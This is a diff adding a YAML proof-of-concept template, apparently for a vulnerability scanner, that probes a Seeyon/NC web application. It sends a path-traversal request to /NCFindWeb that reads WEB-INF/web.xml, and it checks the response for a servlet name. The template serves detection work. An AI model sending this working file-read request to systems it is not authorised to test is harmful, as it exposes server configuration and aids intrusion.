@@ -1,0 +1,13 @@
+name: poc-yaml-seeyon-wooyun-2015-148227
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type == "application/xml" && response.body.bcontains(bytes("<servlet-name>NCInvokerServlet</servlet-name>"))
+expression: r0()
+detail:
+    links:
+        - https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html
